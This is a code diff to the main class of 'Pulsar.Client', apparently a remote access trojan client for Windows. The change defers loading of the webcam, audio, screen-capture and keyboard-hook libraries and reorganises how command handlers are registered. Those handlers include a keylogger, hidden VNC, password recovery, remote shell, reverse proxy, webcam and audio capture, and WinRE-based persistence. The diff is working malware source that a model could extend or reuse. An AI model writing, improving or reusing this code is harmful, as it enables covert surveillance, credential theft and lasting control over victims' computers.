@@ -18,6 +18,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Security.Principal;
 using System.Text;
+using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -61,6 +62,33 @@ namespace Pulsar.Client
         private ActiveWindowChecker _activeWindowChecker;
         private ClipboardChecker _clipboardChecker;
         private DebugLog _debugLog;
+
+        private bool _deferredProcessorsRegistered;
+
+        private static readonly string[] SharpDxAssemblies =
+        {
+            "SharpDX",
+            "SharpDX.Direct3D11",
+            "SharpDX.Direct2D1",
+            "SharpDX.DXGI",
+            "SharpDX.D3DCompiler",
+            "SharpDX.Mathematics"
+        };
+
+        private static readonly string[] WebcamAssemblies =
+        {
+            "AForge",
+            "AForge.Video",
+            "AForge.Video.DirectShow"
+        };
+
+        private static readonly string[] AudioAssemblies =
+        {
+            "NAudio.Core",
+            "NAudio.Wasapi",
+            "NAudio.WinForms",
+            "NAudio.WinMM"
+        };
 
         /// <summary>
         /// Gets the clipboard checker instance.
@@ -107,6 +135,8 @@ namespace Pulsar.Client
             // decrypt and verify the settings
             if (!Settings.Initialize())
                 Environment.Exit(1);
+
+            DeferredAssemblyManager.Initialize();
 
             ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
 
@@ -162,8 +192,31 @@ namespace Pulsar.Client
 
                 if (Settings.ENABLELOGGER)
                 {
-                    _keyloggerService = new KeyloggerService();
-                    _keyloggerService.Start();
+                    DeferredAssemblyManager.RunWhenAvailable(
+                        new[] { "Gma.System.MouseKeyHook" },
+                        () =>
+                        {
+                            try
+                            {
+                                if (_keyloggerService != null)
+                                {
+                                    return;
+                                }
+
+                                if (!DeferredAssemblyManager.TryEnsureAssembliesLoaded("Gma.System.MouseKeyHook"))
+                                {
+                                    Debug.WriteLine("Keylogger dependencies not yet available; deferring start.");
+                                    return;
+                                }
+
+                                _keyloggerService = new KeyloggerService();
+                                _keyloggerService.Start();
+                            }
+                            catch (Exception ex)
+                            {
+                                Debug.WriteLine($"Failed to start keylogger: {ex.Message}");
+                            }
+                        });
                 }
 
                 PulsarClient client;
@@ -247,41 +300,108 @@ namespace Pulsar.Client
         /// <remarks>Always initialize from UI thread.</remarks>
         private void InitializeMessageProcessors(PulsarClient client)
         {
-            //preview stuff
-            _messageProcessors.Add(new PreviewHandler());
-            _messageProcessors.Add(new PingHandler());
+            RegisterProcessor(new DeferredAssemblyHandler());
 
-            _messageProcessors.Add(new QuickCommandHandler());
-            _messageProcessors.Add(new HVNCHandler());
+            RegisterProcessor(new PreviewHandler());
+            RegisterProcessor(new PingHandler());
+            RegisterProcessor(new QuickCommandHandler());
+            RegisterProcessor(new HVNCHandler());
+            RegisterProcessor(new ClientServicesHandler(this, client));
+            RegisterProcessor(new FileManagerHandler(client));
+            RegisterProcessor(new KeyloggerHandler());
+            RegisterProcessor(new MessageBoxHandler());
+            RegisterProcessor(new ClipboardHandler());
+            RegisterProcessor(new FunStuffHandler());
+            RegisterProcessor(new PasswordRecoveryHandler());
+            RegisterProcessor(new RegistryHandler());
+            RegisterProcessor(new RemoteShellHandler(client));
+            RegisterProcessor(new ReverseProxyHandler(client));
+            RegisterProcessor(new ShutdownHandler());
+            RegisterProcessor(new StartupManagerHandler());
+            RegisterProcessor(new SystemInformationHandler());
+            RegisterProcessor(new TaskManagerHandler(client));
+            RegisterProcessor(new TcpConnectionsHandler());
+            RegisterProcessor(new WebsiteVisitorHandler());
+            RegisterProcessor(new RemoteScriptingHandler());
+            RegisterProcessor(new RemoteChatHandler());
+            RegisterProcessor(new WinREPersistenceHandler());
 
-            _messageProcessors.Add(new ClientServicesHandler(this, client));
-            _messageProcessors.Add(new FileManagerHandler(client));
-            _messageProcessors.Add(new KeyloggerHandler());
-            _messageProcessors.Add(new MessageBoxHandler());
-            _messageProcessors.Add(new ClipboardHandler());
-            _messageProcessors.Add(new FunStuffHandler());
-            _messageProcessors.Add(new PasswordRecoveryHandler());
-            _messageProcessors.Add(new RegistryHandler());
-            _messageProcessors.Add(new RemoteDesktopHandler());
-            _messageProcessors.Add(new RemoteWebcamHandler());
-            _messageProcessors.Add(new RemoteShellHandler(client));
-            _messageProcessors.Add(new ReverseProxyHandler(client));
-            _messageProcessors.Add(new ShutdownHandler());
-            _messageProcessors.Add(new StartupManagerHandler());
-            _messageProcessors.Add(new SystemInformationHandler());
-            _messageProcessors.Add(new TaskManagerHandler(client));
-            _messageProcessors.Add(new TcpConnectionsHandler());
-            _messageProcessors.Add(new WebsiteVisitorHandler());
-            _messageProcessors.Add(new RemoteScriptingHandler());
-            _messageProcessors.Add(new AudioHandler());
-            _messageProcessors.Add(new AudioOutputHandler());
-            _messageProcessors.Add(new RemoteChatHandler());
-            _messageProcessors.Add(new WinREPersistenceHandler());
+            ScheduleDeferredMessageProcessors(client);
+        }
 
-            foreach (var msgProc in _messageProcessors)
+        private void RegisterProcessor(IMessageProcessor processor)
+        {
+            if (processor == null)
             {
-                MessageHandler.Register(msgProc);
+                return;
             }
+
+            bool shouldRegister;
+            lock (_messageProcessors)
+            {
+                shouldRegister = !_messageProcessors.Contains(processor);
+                if (shouldRegister)
+                {
+                    _messageProcessors.Add(processor);
+                }
+            }
+
+            if (shouldRegister)
+            {
+                MessageHandler.Register(processor);
+            }
+        }
+
+        private void ScheduleDeferredMessageProcessors(PulsarClient client)
+        {
+            DeferredAssemblyManager.RunWhenAvailable(
+                DeferredAssemblyManager.SecondaryAssemblies,
+                () =>
+                {
+                    Action registerAction = () => RegisterDeferredMessageProcessors(client);
+
+                    try
+                    {
+                        if (InvokeRequired)
+                        {
+                            BeginInvoke((Action)registerAction);
+                        }
+                        else
+                        {
+                            registerAction();
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Failed to schedule deferred message processors: {ex.Message}");
+                    }
+                });
+        }
+
+        private void RegisterDeferredMessageProcessors(PulsarClient client)
+        {
+            if (_deferredProcessorsRegistered)
+            {
+                return;
+            }
+
+            _deferredProcessorsRegistered = true;
+
+            try
+            {
+                DeferredAssemblyManager.TryEnsureAssembliesLoaded(SharpDxAssemblies);
+                DeferredAssemblyManager.TryEnsureAssembliesLoaded(WebcamAssemblies);
+                DeferredAssemblyManager.TryEnsureAssembliesLoaded(AudioAssemblies);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Deferred assembly load error: {ex.Message}");
+            }
+
+            RegisterProcessor(new RemoteDesktopHandler());
+            RegisterProcessor(new RemoteWebcamHandler());
+            RegisterProcessor(new AudioHandler());
+            RegisterProcessor(new AudioOutputHandler());
         }
 
         /// <summary>
@@ -289,11 +409,21 @@ namespace Pulsar.Client
         /// </summary>
         private void CleanupMessageProcessors()
         {
-            foreach (var msgProc in _messageProcessors)
+            List<IMessageProcessor> processorsCopy;
+
+            lock (_messageProcessors)
+            {
+                processorsCopy = new List<IMessageProcessor>(_messageProcessors);
+                _messageProcessors.Clear();
+            }
+
+            foreach (var msgProc in processorsCopy)
             {
                 MessageHandler.Unregister(msgProc);
                 if (msgProc is IDisposable disposableMsgProc)
+                {
                     disposableMsgProc.Dispose();
+                }
             }
         }
 
